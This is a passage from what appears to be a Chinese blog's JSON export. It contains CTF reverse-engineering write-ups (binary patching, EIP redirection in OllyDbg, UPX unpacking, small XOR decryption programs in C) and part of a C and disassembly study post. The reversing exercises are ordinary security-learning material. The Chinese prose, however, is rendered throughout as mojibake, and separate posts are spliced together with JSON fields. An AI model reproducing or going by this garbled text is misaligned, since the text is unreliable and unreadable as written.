å¤„çš„æ±‡ç¼–ä»£ç è¿›è¡Œpatchï¼šæŠŠJNZæ”¹æˆæ­£å¥½ç›¸åçš„JZ ä¿®æ”¹å¥½åæŸ¥çœ‹ä¸‹ç”Ÿæˆçš„ä¼ªä»£ç è¾¾åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚ç„¶åæˆ‘ä»¬éœ€è¦æŠŠè¿™äº›æ‰“patchçš„åœ°æ–¹ä¿å­˜ä¸‹æ¥ï¼Œè®©å…¶æˆæ•ˆï¼šç‚¹å‡»okå³å¯ï¼Œå¯ä»¥ä¸ºäº†å®‰å…¨é€‰æ‹©ä¸€ä¸‹åšä¸ªbakå¤‡ä»½ã€‚ éªŒè¯è¾“å…¥1æ‹¿åˆ°äº†flagã€‚ ç¬¬äºŒç§è¿™ç§ä¸»è¦æ˜¯åœ¨IDAä¸­é™æ€åˆ†æåçŸ¥é“äº†ï¼Œåœ¨ç¨‹åºè°ƒç”¨è¾“å‡ºflagå‡½æ•°åflagå°±æ‰“å°å‡ºæ¥äº†ã€‚å°±å¯ä»¥æƒ³åŠæ³•åœ¨åŠ¨æ€è°ƒè¯•ä¸­ç›´æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°å°±å¯ä»¥äº†ã€‚é‡åœ¨IDAå’ŒODæ­é…ä½¿ç”¨äº†ã€‚ IDAå¯»æ‰¾è¾“å‡ºflagå‡½æ•°çš„å‡½æ•°åœ°å€è®°ä½è¿™ä¸ª0045E940 åœ°å€ã€‚ä¸‹é¢ODç›´æ¥æƒ³åŠæ³•æ‰§è¡Œåˆ°è¯¥åœ°å€ ODåŠ¨æ€è°ƒè¯•å‘ç°åŸºåœ°å€æ˜¯010Fåœ¨ODä¸­æœç´¢å­—ç¬¦ä¸²ï¼Œæ‰¾ä¸€ä¸‹æˆ‘ä»¬åº”è¯¥åœ¨å“ªä¸ªåœ°æ–¹æ‰¾ä¸€ä¸ªåˆé€‚çš„å¯ä»¥æ§åˆ¶çš„ä»£ç æ®µã€‚å‘ç°äº†è¾“å…¥nçš„è¯­å¥åœ°å€ã€‚è®¾ç½®ä¸€ä¸ªæ–­ç‚¹ï¼Œè¿è¡Œç¨‹åºã€‚F9è®©ç¨‹åºè¿è¡Œåˆ°è¿™é‡Œæ–­ä¸‹æ¥ã€‚æŒ‰ç©ºæ ¼ä¿®æ”¹ä¸‹æ±‡ç¼–ä»£ç jmp 0x010FE490 è¿™æ—¶å€™çš„EIPï¼Œç„¶åå•æ­¥æ‰§è¡Œè¿‡æ¥äº†ï¼Œåˆ°äº†è°ƒç”¨è¾“å‡ºflagçš„å‡½æ•°ã€‚ç„¶åæ¥ä¸‹æ¥ä¼šæœ‰å¾ˆå¤šå¾ªç¯å’Œå­—ç¬¦å¤„ç†çš„æ“ä½œï¼Œç›´æ¥å¯ä»¥æŒ‰CTRL+F8æŒ‰é”®è®©ODè‡ªåŠ¨æ‰§è¡Œã€‚è®©æŠŠè¿™ä¸ªå‡½æ•°å¤„ç†å®Œï¼Œå°±ä¼šå‡ºç°flagå­—ç¬¦ä¸²ã€‚ è¿™ç§ä¿®æ”¹EIPæ˜¯é‡ç‚¹å’Œæ‰¾åˆ°åˆé€‚å¯æ§åˆ¶ä»£ç æ®µæ˜¯é‡ç‚¹ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åœ¨æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ§åˆ¶ä»£ç åï¼Œåœ¨æœç´¢å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°å•å‡»è¿‡å»ï¼Œç„¶ååœ¨è¿™ä¸ªå‡½æ•°çš„å¼€å¤´è®¾ç½®ä¸ºæ–°çš„EIPç„¶åæŒ‰ä¸€ä¸‹F8å°±æ¥åˆ°äº†è¿™ä¸ªå‡½æ•°é‡Œé¢äº†ã€‚å†è¿›è¡Œåˆšåˆšçš„æ“ä½œå°±å¯ä»¥äº†ã€‚ ç¬¬ä¸‰ç§è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬æ‰¾åˆ°äº†å…³é”®å‡½æ•°ï¼Œåˆ†æä»¥åæ˜¯å¯ä»¥æŠŠè¿™ä¸ªå‡½æ•°æ˜¯å†™å‡ºæ¥çš„ï¼Œç„¶åæ ¹æ®ä¼ªä»£ç å†™å‡ºåŸæ¥çš„ç¨‹åºå°±å¯ä»¥äº†ã€‚ ODé™æ€åˆ†æè°ƒç”¨å…¶å‡½æ•°ã€‚åŒå‡»è¿›å…¥F5ç”Ÿæˆä¼ªä»£ç ï¼šï¼ˆåªæ˜¯æˆªå–ä¸€éƒ¨åˆ†ï¼‰åˆ†æå¯ä»¥å¾—çŸ¥æ˜¯åˆ†æˆäº†2ä¸ªå­—ç¬¦æ•°ç»„ï¼Œä¸€ä¸ªV2åˆ°V58ï¼Œä¸€ä¸ªV59åˆ°V115ï¼Œéƒ½æ˜¯56çš„é•¿åº¦ï¼Œç„¶åä¸‹é¢å°±æ˜¯ä¸¤ä¸ªå¼‚æˆ–æ“ä½œäº†ã€‚ç›´æ¥æ”¹æˆCä»£ç ï¼Œå› ä¸ºè¿˜ä¸ä¼šå†™Pythonã€‚ #include &lt;iostream&gt; #include &lt;string.h&gt; int main() { int i; char arr1[]={123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0}; char arr2[]={18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0}; for ( i = 0; i &lt; 56; ++i ) { arr1[i] ^= arr2[i]; arr1[i] ^= 0x13u; } printf(&quot;%s&quot;,arr1); return 0; }è¿è¡Œå°±æ‹¿åˆ°äº†flagã€‚ Hello, CTFæ ¹æ®é¢˜ç›®æè¿°ï¼šèœé¸¡å‘ç°Flagä¼¼ä¹å¹¶ä¸ä¸€å®šæ˜¯æ˜æ–‡æ¯”è¾ƒçš„è‚¯å®šæ˜¯è¿›è¡Œäº†æŸç§åŠ å¯†ã€‚ å…ˆæŸ¥å£³æ— å£³ï¼Œ32ä½c++ç¨‹åº è¿è¡Œç¨‹åºè¾“å…¥æ­£ç¡®çš„serialï¼Œä¼šæç¤ºæ­£ç¡®ã€‚ IDAé™æ€åˆ†æè¿›å…¥mainå‡½æ•°ï¼ŒF5å¤§æ³•æŸ¥çœ‹ä¼ªä»£ç å‘ç°æ˜¯v10æ•°ç»„ä¸v13æ•°ç»„é€å¯¹æ¯”åï¼Œå¦‚æœç›¸åŒå°±ä¼šè¾“å‡ºæ­£ç¡®çš„å­—çœ¼ã€‚å‰é¢æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„v9è¿›è¡Œä¸€äº›å¤„ç†ï¼Œå¤„ç†å®Œåä¼šæ”¾å…¥v10ä¸­ã€‚ä¸‹é¢å…·ä½“åˆ†æä¸€ä¸‹å¦‚ä½•å¤„ç†å°±å¯ä»¥äº†ï¼Œä¸»è¦åœ¨sprintfå‡½æ•°å’Œstrcatå‡½æ•°ã€‚ç‚¹å‡»è¿›å»çœ‹åˆ°é‚£å°±å¾ˆæ¸…æ¥šäº†ï¼Œå°±æ˜¯æŠŠv4å­—ç¬¦ä¸²ä¹Ÿå°±æ˜¯åˆšåˆšè¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œæ ¼å¼åŒ–ä½16è¿›åˆ¶çš„æ•´æ•°è¾“å‡ºåˆ°v8ä¸­ï¼Œç„¶åç”¨strcatå‡½æ•°æŠŠå¤„ç†åçš„v8æ”¾å…¥v10ã€‚ï¼ˆæ­¤å¤„åŸæ¥çš„v10æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥è¿æ¥v10å’Œv8ï¼Œå®é™…ç›¸å½“äºæŠŠv8æ”¾å…¥v10ï¼‰ æ¥ä¸‹æ¥å°±æ˜¯v10ä¸v13è¿›è¡Œå¯¹æ¯”ï¼Œv13æ˜¯åˆšåˆšå¤åˆ¶è¿‡æ¥çš„437261636b4d654a757374466f7246756eï¼Œé‚£å°±å¯ä»¥çœ‹å‡ºæ¥å’±ä»¬ç›´æ¥æŠŠè¿™ä¸ªè¿›è¡Œ16è¿›åˆ¶è½¬å›å»å°±å¯ä»¥äº†ã€‚ open-sourceè¿™é“é¢˜æ˜¯æ‹¿åˆ°äº†ä¸€æ®µcæºç ï¼Œæ‰“å¼€å‘ç°å…³é”®å¤„ï¼šå¯ä»¥çœ‹å‡ºæ¥æŠŠfirst second strlen(argv[3])ææ¸…æ¥šæ˜¯ä»€ä¹ˆå°±å¯ä»¥äº†ã€‚å¾ˆç®€å•å¯ä»¥çœ‹å‡ºè¿™3ä¸ªæ˜¯ä»€ä¹ˆå€¼ï¼Œä¸‹é¢ç›´æ¥æ”¾è§£å¯†ä»£ç ï¼š #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;iostream&gt; int main(int argc, char *argv[]) { unsigned int hash = 0xcafe * 31337 + (25 % 17) * 11 + strlen(&quot;h4cky0u&quot;) - 1615810207; printf(&quot;Get your key: &quot;); printf(&quot;%x\\n&quot;, hash); return 0; }æ‹¿åˆ°flagï¼š simple-unpackåˆ†æè¿™ä¸ªçœ‹é¢˜ç›®å°±æ˜¯çŸ¥é“åŠ äº†å£³ã€‚ä¸”æ˜¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸¢è¿›edbçœ‹ä¸€ä¸‹ã€‚ å•æ­¥è°ƒè¯•èµ°ä¸€ä¼šï¼Œåœ¨å¯„å­˜å™¨çª—å£çœ‹åˆ°ï¼šè¿™å¾ˆæ˜æ˜¾æ˜¯åŠ äº†UPXå£³ã€‚ è„±å£³è¿™é‡Œå°±ç”¨upx -dç›´æ¥ä¸€é”®è„±å£³ã€‚ä»¥åå¯ä»¥ç»ƒä¹ æ‰‹åŠ¨è„±upxå£³ã€‚è„±å£³å®Œæˆåç”¨IDAè¿›è¡Œåˆ†æï¼š IDAé™æ€åˆ†ææ‰“å¼€ç›´æ¥å‡ºç°äº†flagï¼Œè¿™ä¸ªé¢˜å°±è€ƒä¸ªè¯†åˆ«å£³å’Œupxè„±å£³äº†ã€‚ logmeinå…ˆæŸ¥çœ‹ä¸€ä¸‹ï¼Œæ— å£³ï¼Œelf 64ä½åº”ç”¨ã€‚ IDAé™æ€åˆ†æç‚¹å‡»æ­¤å¤„å‡ºç°äº†ï¼šç¡®è®¤å…³é”®ä»£ç æ®µã€‚å¼€å§‹å¯¹è¿™ä¸ªå¾ªç¯è¿›è¡Œåˆ†æï¼Œéœ€è¦å¯¹v8 v7 v9é‡ç‚¹åˆ†æã€‚è¿™é‡Œé¢éš¾ç‚¹å°±åœ¨å¦‚ä½•å¯¹v8çš„ç†è§£ã€‚ v8ä¸å…³é”®åŠ å¯†åˆ†æv8æ˜¯ä¸€ä¸ª_int64ä¹Ÿå°±æ˜¯long longç±»å‹çš„æ•°å€¼ï¼Œå…¶å­˜å…¥å†…å­˜éœ€è¦å˜æˆ16è¿›åˆ¶çš„æ•°å€¼å­˜å…¥ã€‚åˆšåˆšæˆ‘ä»¬æ³¨æ„åˆ°è¿™ä¸ªx86æ¡†æ¶x64çš„ç¨‹åºï¼Œå…¶åœ¨å†…å­˜æ˜¯ç”¨å°ç«¯åºå­˜å…¥çš„ï¼Œä¹Ÿå°±æ˜¯åœ°å€é«˜ä½æ”¾æ•°å€¼é«˜ä½ï¼Œåœ°å€ä½ä½æ”¾åœ°å€ä½ä½ã€‚é‚£ä¹ˆå…¶æ”¾å¥½å°±æ˜¯æ­£å¥½æ˜¯åè¿‡æ¥çš„ã€‚ç„¶ååˆ†æä¸€ä¸‹åŠ å¯†ä»£ç ï¼Œè¿™ä¸»è¦å°±æ˜¯æŒ‡é’ˆçŸ¥è¯†äº†ï¼šv4 = (unsigned int)(char)(*((_BYTE *)&amp;v8 + i % v7) ^ v9[i]);è¿™é‡Œçš„ï¼ˆcharï¼‰æ˜¯ç»™long longå¼ºåˆ¶è½¬å‹ï¼Œç„¶åä¸ºäº†åé¢çš„ä»¥2ä½16è¿›åˆ¶æ•°ä¹Ÿå°±æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œæ¥è¯»å–æ•°å€¼ã€‚i % v7å…¶æ˜¯å°±æ˜¯æ§åˆ¶i = 0â€”6æ­£å¥½æŠŠè¿™ä¸ªv8ç»™æ­£ç¡®è¯»å–å®Œã€‚ç„¶åä¸€ä½ä½å–å®Œv8åå¼€å§‹è·Ÿv9å¼‚æˆ–ã€‚ è„šæœ¬è§£å¯†#include &lt;iostream&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { int v6; char v7[]=&quot;harambe&quot;; v6 = 7; char v8[18]; strcpy(v8, &quot;:\\&quot;AL_RT^L*.?+6/46&quot;); char s[18]; int i; for ( i = 0; i &lt; strlen(v8); ++i) { s[i] =v7[i%v6]^v8[i]; } for (int j = 0; j &lt; strlen(v8); ++j) { printf(&quot;%c&quot;,s[j]); } return 0; } å¯¹äºå¤§å°ç«¯åºçš„çŸ¥è¯†è¡¥å……æ•°æ®ç±»å‹ä¸ºå­—èŠ‚å‹( BYTE)æ—¶ï¼Œå…¶é•¿åº¦ä¸º1ä¸ªå­—èŠ‚,ä¿å­˜è¿™æ ·çš„æ•°æ®æ—¶ï¼Œæ— è®ºé‡‡ç”¨å¤§ç«¯åºè¿˜æ˜¯å°ç«¯åºï¼Œå­—èŠ‚é¡ºåºéƒ½æ˜¯ä¸€æ ·çš„ã€‚ä½†æ˜¯æ•°æ®é•¿åº¦ä¸º2ä¸ªå­—èŠ‚ä»¥ä¸Š(å«2ä¸ªå­—èŠ‚)æ—¶ï¼Œé‡‡ç”¨ä¸åŒå­—èŠ‚åºä¿å­˜å®ƒä»¬å½¢æˆçš„å­˜å‚¨é¡ºåºæ˜¯ä¸åŒçš„ã€‚é‡‡ç”¨å¤§ç«¯åºå­˜å‚¨æ•°æ®æ—¶ï¼Œå†…å­˜åœ°å€ä½ä½å­˜å‚¨æ•°æ®çš„é«˜ä½ï¼Œå†…å­˜åœ°å€é«˜ä½å­˜å‚¨æ•°æ®çš„ä½ä½ï¼Œè¿™æ˜¯ä¸€ç§æœ€ç›´è§‚çš„å­—èŠ‚å­˜å‚¨é¡ºåº;é‡‡ç”¨å°ç«¯åºå­˜å‚¨æ•°æ®æ—¶,åœ°å€é«˜ä½å­˜å‚¨æ•°æ®çš„é«˜ä½ï¼Œåœ°å€ä½ä½å­˜å‚¨æ•°æ®çš„ä½ä½ï¼Œè¿™æ˜¯ä¸€ç§é€†åºå­˜å‚¨æ–¹å¼ï¼Œä¿å­˜çš„å­—èŠ‚é¡ºåºè¢«å€’è½¬ï¼Œå®ƒæ˜¯æœ€ç¬¦åˆäººç±»æ€ç»´çš„å­—èŠ‚åºã€‚ å¼ºè°ƒï¼šåªæœ‰æ•°æ®é•¿åº¦åœ¨2ä¸ªå­—èŠ‚ä»¥ä¸Šæ—¶ï¼Œå³æ•°æ®ä¸ºå¤šå­—èŠ‚æ•°æ®æ—¶ï¼Œé€‰ç”¨å¤§ç«¯åºè¿˜æ˜¯å°ç«¯åºä¼šå¯¼è‡´æ•°æ®çš„å­˜å‚¨é¡ºåºä¸åŒã€‚å­—ç¬¦ä¸²â€œabcdeâ€ è¢«ä¿å­˜åœ¨ä¸€ä¸ªå­—ç¬¦ ( Char )æ•°ç»„strä¸­,å­—ç¬¦æ•°ç»„åœ¨å†…å­˜ä¸­æ˜¯è¿ç»­çš„ï¼Œæ­¤æ—¶å‘å­—ç¬¦æ•°ç»„å­˜æ”¾æ•°æ®ï¼Œæ— è®ºé‡‡ç”¨å¤§ç«¯åºè¿˜æ˜¯å°ç«¯åºï¼Œå­˜å‚¨é¡ºåºéƒ½ç›¸åŒã€‚ insanityè¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œä¸»å‡½æ•°ç‚¹å‡»ä¸€ä¸‹ä»–è¦æ‰“å°çš„å­—ç¬¦ä¸²å°±å¯ä»¥çœ‹åˆ°äº†flagï¼Œå½“ç„¶shift + f12ä¹Ÿæ˜¯å¯ä»¥çœ‹åˆ°ã€‚ no-strings-attachedcsaw2013reversing2getitpython-trademaze","categories":[],"tags":[{"name":"Re","slug":"Re","permalink":"http://chumen77.xyz/tags/Re/"},{"name":"WP","slug":"WP","permalink":"http://chumen77.xyz/tags/WP/"}]},{"title":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰","slug":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰","date":"2019-10-23T14:48:14.000Z","updated":"2020-02-28T07:53:42.000Z","comments":true,"path":"2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/","link":"","permalink":"http://chumen77.xyz/2019/10/23/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰/","excerpt":"","text":"Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆå››ï¼‰å‰è¨€æœ¬æ¬¡ä¸»è¦å­¦ä¹ ä»¥ä¸‹å†…å®¹ å†…å­˜å›¾ å…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡ å‡½æ•°å‚æ•°çš„åˆ†æ åˆ†æ”¯è¯­å¥:if if...else... if..else if..else if....elseåˆ†æ”¯è¯­å¥çš„åµŒå¥—ä½¿ç”¨``çš„æ­£å‘ä¸é€†å‘åˆ†æ å†…å­˜å›¾åœ¨ç”µè„‘ä¸­ä»»ä½•ä¸€ä¸ªç¨‹åºè¿è¡Œæ—¶ï¼Œå…¶ä¼šåœ¨å†…å­˜ä¸­åˆ†æˆä»¥ä¸Šå›¾ä¸­çš„å‡ ä¸ªåŒºåŸŸã€‚è¯¦ç»†æ¯ä¸ªåŒºæ˜¯æ€ä¹ˆæ ·çš„ï¼Œç›´æ¥çœ‹å›¾å³å¯ã€‚ å…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡int g_n = 10; //å…¨å±€å˜é‡ int Funcation() //ä»£ç åŒºï¼Œè°ƒç”¨æ—¶æ‰§è¡Œ { int x = 1;//å±€éƒ¨å˜é‡ int y = 3; return g_n+x+y; } }å°±ç”¨è¿™ä¸ªä»£ç æ®µæ¥åˆ†æã€‚ å…¨å±€å˜é‡çš„ç‰¹ç‚¹1ã€å…¨å±€å˜é‡åœ¨ç¨‹åºç¼–è¯‘å®Œæˆååœ°å€å°±å·²ç»ç¡®å®šä¸‹æ¥äº†ï¼Œåªè¦ç¨‹åºå¯åŠ¨ï¼Œå…¨å±€å˜é‡å°±å·²ç»å­˜åœ¨äº†ï¼Œå¯åŠ¨åé‡Œé¢æ˜¯å¦æœ‰å€¼å–å†³äºå£°æ˜æ—¶æ˜¯å¦ç»™å®šäº†åˆå§‹å€¼ï¼Œå¦‚æœæ²¡æœ‰ï¼Œé»˜è®¤ä¸º0ã€‚2ã€å…¨å±€å˜é‡çš„å€¼å¯ä»¥è¢«æ‰€æœ‰å‡½æ•°æ‰€ä¿®æ”¹ï¼Œé‡Œé¢å­˜å‚¨çš„æ˜¯æœ€åä¸€æ¬¡ä¿®æ”¹çš„å€¼.3ã€å…¨å±€å˜é‡æ‰€å å†…å­˜ä¼šä¸€ç›´å­˜åœ¨ï¼ŒçŸ¥é“æ•´ä¸ªè¿›ç¨‹ç»“æŸ.4ã€å…¨å±€å˜é‡çš„åæ±‡ç¼–è¯†åˆ«ï¼šMOV å¯„å­˜å™¨,byte/word/dword ptr ds:[0x12345678]é€šè¿‡å¯„å­˜å™¨çš„å®½åº¦ï¼Œæˆ–è€…byte/word/dword æ¥åˆ¤æ–­å…¨å±€å˜é‡çš„å®½åº¦.å…¨å±€å˜é‡å°±æ˜¯æ‰€è°“çš„åŸºå€ã€‚ å±€éƒ¨å˜é‡çš„ç‰¹ç‚¹1ã€å±€éƒ¨å˜é‡åœ¨ç¨‹åºç¼–è¯‘å®Œæˆåå¹¶æ²¡æœ‰åˆ†é…å›ºå®šçš„åœ°å€.ï¼ˆå› ä¸ºè®¡ç®—æœºä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¸ä¼šæå‰åˆ†é…å¥½ï¼‰2ã€åœ¨æ‰€å±çš„æ–¹æ³•æ²¡æœ‰è¢«è°ƒç”¨æ—¶ï¼Œå±€éƒ¨å˜é‡å¹¶ä¸ä¼šåˆ†é…å†…å­˜åœ°å€ï¼Œåªæœ‰å½“æ‰€å±çš„ç¨‹åºè¢«è°ƒç”¨äº†ï¼Œæ‰ä¼šåœ¨å †æ ˆä¸­åˆ†é…å†…å­˜.3ã€å½“å±€éƒ¨å˜é‡æ‰€å±çš„å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œå±€éƒ¨å˜é‡æ‰€å ç”¨çš„å†…å­˜å°†å˜æˆåƒåœ¾æ•°æ®.å±€éƒ¨å˜é‡æ¶ˆå¤±.4ã€å±€éƒ¨å˜é‡åªèƒ½åœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨ï¼Œå‡½æ•°Aæ— æ³•ä½¿ç”¨å‡½æ•°Bçš„å±€éƒ¨å˜é‡.ï¼ˆä»å †æ ˆå›¾ä¸­ä¹Ÿå¯ä»¥æƒ³è±¡çš„åˆ°åŸç†ï¼‰5ã€å±€éƒ¨å˜é‡çš„åæ±‡ç¼–è¯†åˆ«ï¼š[ebp-4][ebp-8][ebp-0xC]ç­‰ç­‰ç±»ä¼¼çš„æƒ…å½¢ã€‚ å‡½æ•°å‚æ•°çš„åˆ†æå¦‚ä½•åˆ¤æ–­å‡½æ•°æœ‰å‡ ä¸ªå‚æ•°ï¼Œå·²ç»åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ ä¸€èˆ¬æƒ…å†µï¼š æ­¥éª¤ä¸€ï¼šè§‚å¯Ÿè°ƒç”¨å¤„çš„ä»£ç  push 3 push 2 push 1 call 0040100f æ­¥éª¤äºŒï¼šæ‰¾åˆ°å¹³è¡¡å †æ ˆçš„ä»£ç ç»§ç»­è®ºè¯ call 0040100f add esp,0Chæˆ–è€…å‡½æ•°å†…éƒ¨ ret 4/8/0xC/0x10æœ€åï¼Œä¸¤è€…ä¸€ç»¼åˆï¼Œå‡½æ•°çš„å‚æ•°ä¸ªæ•°åŸºæœ¬ç¡®å®š.å¯ä»¥åº”å¯¹ç™¾åˆ†ä¹‹å…«åçš„æƒ…å†µã€‚ ä½†å‰©ä¸‹çš„ç™¾åˆ†ä¹‹äºŒåå‘¢ï¼Ÿä¸Šé¢çš„åˆ†æå­˜åœ¨çš„é—®é¢˜ï¼š1ã€å‚æ•°ä¼ é€’æœªå¿…éƒ½æ˜¯é€šè¿‡å †æ ˆï¼Œè¿˜å¯èƒ½é€šè¿‡ä½¿ç”¨å¯„å­˜å™¨.ä¾‹ï¼š push ebx push eax mov ecx,dword ptr ds:[esi] mov edx,dword ptr ds:[edi] push 45 push 33 call å‡½æ•°åœ°å€2ã€å‡½æ•°è°ƒç”¨å¤„çš„ä»£ç æ— æ³•æŸ¥çœ‹.ä¾‹ï¼šè¿›å…¥å‡½æ•°æŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼š 00401050 push ebp 00401051 mov ebp,esp 00401053 sub esp,48h 00401056 push ebx 00401057 push esi 00401058 push edi 00401059 push ecx 0040105A lea edi,[ebp-48h] 0040105D mov ecx,12h 00401062 mov eax,0CCCCCCCCh 00401067 rep stos dword ptr [edi] 00401069 pop ecx 0040106A mov dword ptr [ebp-8],edx 0040106D mov dword ptr [ebp-4],ecx 00401070 mov eax,dword ptr [ebp-4] 00401073 add eax,dword ptr [ebp-8] 00401076 add eax,dword ptr [ebp+8] 00401079 mov [g_x (00427958)],eax 0040107E pop edi 0040107F pop esi 00401080 pop ebx 00401081 mov esp,ebp 00401083 pop ebp 00401084 ret 4 è§‚å¯Ÿæ­¥éª¤ï¼š1ã€ä¸è€ƒè™‘ebpã€esp2ã€åªæ‰¾ç»™åˆ«äººèµ‹å€¼çš„å¯„å­˜å™¨eax/ecx/edx/ebx/esi/edi3ã€æ‰¾åˆ°ä»¥åè¿½æŸ¥å…¶æ¥æºï¼Œå¦‚æœï¼Œè¯¥å¯„å­˜å™¨ä¸­çš„å€¼ï¼Œä¸æ˜¯åœ¨å‡½æ•°å†…å­˜èµ‹å€¼çš„ï¼Œé‚£ä¸€å®šæ˜¯ä¼ è¿›æ¥çš„å‚æ•°.**å…¬å¼ä¸€ï¼šå¯„å­˜å™¨ + ret 4\\8\\0C = å‚æ•°ä¸ªæ•°å…¬å¼äºŒï¼šå¯„å­˜å™¨ + [ebp+8]+[ebp+0x] = å‚æ•°ä¸ªæ•°**è¿™ä¸¤ä¸ªå…¬å¼å¯ä»¥äº’ç›¸ç»“åˆéªŒè¯çœ‹æ˜¯å¦ç®—çš„å¯¹ã€‚å¦‚ä»¥ä¸Šä»£ç æ®µï¼Œåªå¯ä»¥æ‰¾åˆ°edi,ecx,edxç»™åˆ«äººèµ‹å€¼ï¼Œä½†æ˜¯å…¶ä¸­edi ecxéƒ½æ˜¯å‡½æ•°å†…å­˜èµ‹çš„å€¼ï¼Œæ‰€ä»¥åªå‰©ä¸‹edxï¼Œåœ¨åŠ ä¸Šæœ€åçš„ret 4ï¼ˆè¿™ä¸ªè‚¯å®šæ˜¯pushè¿›æ¥äº†ä¸€ä¸ªå‚æ•°ï¼‰å°±ç­‰äº2ï¼Œä¹Ÿå°±æ˜¯2ä¸ªå‚æ•°ã€‚ä¸å…¬å¼äºŒæ£€éªŒå‘ç°æ²¡é—®é¢˜ï¼Œ[ebp+0x]ç±»ä¼¼çš„åªå‡ºç°ä¸€ä¸ª. åˆ†æ”¯è¯­å¥æ­£å‘ä»£ç ç»ƒä¹  ç»ƒä¹ 1:å®šä¹‰4ä¸ªintç±»å‹çš„å…¨å±€å˜é‡ï¼Œåˆ†åˆ«æ˜¯g_x,g_y,g_z,g_r,ä½¿ç”¨if..else..åˆ†æ”¯è¯­å¥ï¼Œå°†æœ€å¤§çš„å€¼å­˜å‚¨åˆ°g_rä¸­ã€‚ #include â€œstdafx.hâ€ int g_x = 5; int g_y = 3; int g_z = 7; int g_r = 0; void getMax() { if(g_x&gt;g_y) { if (g_x&gt;g_z) { g_r=g_x; } else{ g_r=g_z; } } else if (g_y &gt; g_z) { g_r=g_y; } else g_r=g_z; printf(â€œ%d\\nâ€,g_r); } int main(int argc, char* argv[]) { getMax(); return 0; } ç»ƒä¹ 2:æ‰¾å‡ºæ•°ç»„é‡Œé¢æœ€å¤§çš„å€¼ï¼Œå¹¶å­˜å‚¨åˆ°å…¨å±€å˜é‡ä¸­ #include â€œstdafx.hâ€ int a[4] = {2,5,7,9}; int g_r = 0; void getMax() { if(a[0]&gt;a[1]) { if (a[0]&gt;a[2]) { if (a[0]&gt;a[3]) { g_r=a[0]; } else g_r=a[3]; } else if(a[2]&gt;a[3]){ g_r=a[2]; } else g_r=a[3]; } else if (a[1] &gt; a[2]) { if (a[1]&gt;a[3]) { g_r=a[1]; } else g_r=a[3]; } else if (a[2] &gt; a[3]) { g_r=a[2]; } else g_r=a[3]; printf(â€œ%d\\nâ€,g_r); } int main(int argc, char* argv[]) { getMax(); return 0; } æ„Ÿæ‚Ÿ1ï¼šåˆ†æ”¯è¯­å¥ä¸­if else,åŠå…¶ç›¸äº’å¥—ç”¨ï¼Œè¦çŸ¥é“å½“æŸä¸ªæ¡ä»¶æˆåŠŸåï¼Œæ‰§è¡Œå…¶ä¸­çš„ä»£ç ï¼Œç„¶åä»¥åäºå®ƒçš„ä»£ç éƒ½ä¸ä¼šå†è¿›è¡Œåˆ¤æ–­å’Œæ‰§è¡Œã€‚2ï¼šä¸€ä¸ªifåªå¯¹åº”äºä¸€ä¸ªelseï¼Œelseåªèƒ½åœ¨ifåå‡ºç°ä¸å…¶æ­é…ä½¿ç”¨ã€‚ é€†å‘åˆ†æIFè¯­å¥é€†å‘åˆ†æç‰¹å¾è¯†åˆ«:é¦–å…ˆä¼šæœ‰ä¸€ä¸ªjxxæŒ‡ä»¤ç”¨äºå‘ä¸‹è·³è½¬ï¼Œä¸”è·³è½¬çš„ç›®çš„è¿‘endä¸­æ²¡æœ‰jmpæŒ‡ä»¤ã€‚æ ¹æ®ä»¥ä¸Šç‰¹å¾ï¼ŒæŠŠjxxæŒ‡ä»¤å–ååï¼Œå³å¯è¿˜åŸifè¯­å¥çš„ä»£ç ã€‚ï¼ˆæˆ‘ä»¬è¦çŸ¥é“jccä»£ç è·³è½¬è¯­å¥ï¼Œå…¶åˆ¤æ–­æ¡ä»¶æ­£å¥½è·Ÿcçš„ifåˆ¤æ–­æ¡ä»¶æ˜¯æ­£å¥½åè¿‡æ¥çš„ã€‚ï¼‰æ±‡ç¼–ä»£ç ï¼šå¯¹äºè¿™æ®µä»£ç æˆ‘ä»¬é‡‡å–ä¸€å®šçš„åˆ†æé¡ºåºæ¥åˆ†æï¼š åˆ†æå‚æ•°ï¼š[ebp+8] : X [ebp+0Ch] :Y åˆ†æå±€éƒ¨å˜é‡ æ—  åˆ†æå…¨å±€å˜é‡ mov dword ptr 004225c4,ecx 